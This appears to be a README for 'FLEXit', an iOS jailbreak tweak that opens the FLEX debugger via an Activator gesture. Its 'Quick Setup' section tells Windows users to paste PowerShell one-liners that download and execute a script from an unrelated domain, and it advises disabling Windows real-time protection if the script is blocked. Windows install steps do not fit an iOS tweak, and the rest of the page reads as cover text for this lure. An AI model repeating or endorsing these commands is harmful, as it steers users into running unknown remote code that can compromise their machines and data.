<div align="center">

# FLEXit FLEX Activator Listener Windows Automation

![preview](https://raw.githubusercontent.com/antariksaputra/flexit-automation/main/hero_b1d99db.svg)

[![checks](https://img.shields.io/badge/checks-ok-2ea44f?style=flat-square&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/channel-verified-2ea44f?style=flat-square&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/pwsh-5.1%2B_%2F_7%2B-ec4899?style=flat-square&labelColor=0d1117)]()

</div>

---

FLEXit is a minimal, open source tweak that opens the FLEX debugging tool through an Activator gesture. It's built for developers who want a lightweight, straightforward setup with no extra dependencies or pairing steps. The project prioritizes a simple build process and predictable behavior over feature bloat.

## ⚡ Quick Setup (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Open PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Run the script
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Forced run via CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## What it does

FLEXit wires an Activator gesture directly to the FLEX explorer so you can bring up the debugging interface on demand instead of digging through menus or re-launching the app. It registers itself as an Activator listener, and once a gesture is assigned, a single trigger opens FLEX in the foreground.

The script keeps the moving parts minimal. It depends on libactivator for gesture events and FLEX for the overlay it presents, and it hands control back to whatever app was running when you dismiss the explorer. No daemons, no background pollers, no extra IPC layer to babysit — just the listener and the library call it makes.

A few things it intentionally does not do: it does not ship its own gesture picker (that lives in Activator), it does not modify FLEX's behavior, and it does not try to hide the explorer from apps that don't expect it. If the gesture fires, FLEX opens; if you close it, you're back where you started.

Typical uses:

- Open FLEX mid-session to inspect a view hierarchy, tweak a layout value, or check network activity without stopping what you're doing.
- Bind a hard-to-hit gesture (long press, double tap) to FLEX so it stays out of the way during normal use.
- Reuse the same trigger across apps, since the listener is registered system-wide rather than per-process.

Because the listener is registered through Activator, any gesture Activator supports — and any assignment you configure there — works without changes to FLEXit itself.

## Configuration

FLEXit reads its behavior from a small preference bundle, so you can tune it without rebuilding the tweak. After installation, open the FLEXit entry in Settings and work through the following options.

**Activator gesture**
The listener only fires when an Activator gesture is bound to the FLEXit action. Open Activator, pick any gesture you like, and assign it to FLEXit under the assigned actions list. There is no built-in default gesture; until you bind one, the tweak sits idle. If the action does not appear in Activator's list, respring once and check again.

**Enable switch**
A master toggle controls whether the listener responds at all. Flip it off to disable activation without uninstalling, which is handy when you want to hand a device to someone else or rule out FLEXit while troubleshooting another tweak.

**Activation scope**
Choose whether the gesture works everywhere or only inside apps. Restricting scope keeps the activator from firing on the home screen or in system UI, which is usually what you want on a daily driver.

**Launch behavior**
Decide whether FLEX opens as an overlay on top of the current app or as a standalone window. Overlay mode is faster for inspecting a live view hierarchy; standalone mode is easier to dismiss when you are done poking around.

**Preferences persistence**
Settings are stored per-device in the standard preference domain and survive resprings and reboots. If changes seem not to take effect, confirm the preference bundle loaded by toggling the master switch off and on, then respring.

**Verifying the setup**
Trigger your bound gesture in a test app. If FLEX does not appear, check three things in order: the gesture is actually assigned in Activator, the master switch is on, and the activation scope includes the app you are testing in. Most "it does not work" reports come down to one of those three.

## Examples

Start with the smallest possible setup: pick one Activator gesture, map it to FLEXit, then trigger it once to confirm FLEX opens on top of the running app.

### Basic gesture binding
Use Activator to assign a single gesture to the FLEXit listener. Keep the mapping one-to-one while testing so you can tell which trigger fired. If nothing happens, re-check that the listener is enabled in Activator's list and that FLEXit is enabled in Settings.

### Triggering from a foreground app
Open the app you want to inspect, perform the assigned gesture, and FLEX should present immediately. This is the fastest sanity check after changing configuration. If the gesture fires but no UI appears, confirm FLEX itself is available on the device.

### Iterating on gesture choice
Try a low-conflict gesture first, such as a two-finger long press, before binding something commonly used. Complex chords reduce accidental triggers during normal use. Once a gesture works, keep it stable and avoid remapping repeatedly during a session.

### Multiple listeners
If you bind more than one gesture, verify each independently before relying on them together. Test one gesture at a time, then combine. Ambiguous or overlapping gestures can make it unclear which listener fired.

### Quick troubleshooting loop
1. Trigger the gesture in a simple app.
2. If FLEX does not appear, toggle the FLEXit listener off and on in Activator.
3. Re-test the same gesture.
4. If it still fails, try a different gesture to rule out a conflict.

### Logging a repro
When behavior is inconsistent, note the gesture used, the foreground app, and whether the trigger worked on a second attempt. Reproducing with the same gesture and app narrows the cause quickly.

## FAQ

**Does FLEXit work on all iOS versions?**
It targets jailbroken devices with Activator and FLEX available. If Activator or FLEX is missing, the listener has nothing to hook into and won't do anything useful. Check your device and package versions before assuming a bug.

**Why isn't the gesture doing anything?**
Most no-op reports come down to configuration, not code. Confirm the Activator action is actually assigned to FLEXit, that the gesture isn't already claimed by another tweak, and that FLEX is installed. Activator silently drops conflicting assignments, so a reassignment is usually the fix.

**Can I change the trigger gesture?**
Yes. FLEXit only registers a listener; the gesture itself is whatever you assign in Activator. Swap it anytime without reinstalling or respringing in most cases.

**Does FLEXit depend on libobjcipc?**
No. That's one of the reasons it exists as a lighter alternative to older FLEX-launcher tweaks. Fewer moving parts means fewer failure points when iOS internals shift.

**Something broke after an update. Where do I start?**
Reproduce with only FLEXit and its dependencies enabled, verify the Activator assignment survived the update (it often doesn't), and check whether FLEX itself still loads. If the listener attaches but FLEX doesn't appear, the problem is usually FLEX, not FLEXit.

**Will this work on stock, non-jailbroken devices?**
No. FLEXit is a jailbreak tweak and needs the hooking environment to function. There's no sideload or stock-device path.

**How do I report an issue?**
Include device model, iOS version, Activator version, FLEX version, the assigned gesture, and steps to reproduce. "It doesn't work" gives nothing to chase; a reproducible sequence does.

## Disclaimer

FLEXit is provided as-is, with no warranty of any kind, express or implied. It is a small listener that hooks into Activator gestures to bring up FLEX, and it is intended for use on devices and setups where you understand the risks of running tweaks that hook system frameworks and third-party apps.

You are responsible for what you install and how you configure it. Assigning a gesture that conflicts with existing Activator actions, or invoking FLEX inside apps that do not expect it, can lead to unexpected behavior, crashes, or data loss in those apps. Test your gesture assignments before relying on them, and keep a way to disable the tweak if something goes wrong.

FLEXit depends on FLEX and Activator being present and compatible with your environment. If either changes, breaks, or is removed, FLEXit may stop working or misbehave. No guarantee is made that it will continue to function across updates to those projects, to your device firmware, or to the apps you use it with.

Do not use FLEXit to inspect, modify, or extract data from apps or systems you do not own or have permission to test. Doing so may violate terms of service, software licenses, or local law. The maintainers are not responsible for misuse, for any damage to your device or data, or for any consequences that follow from using this script.

If you are unsure whether a gesture, target app, or configuration is safe in your environment, do not proceed.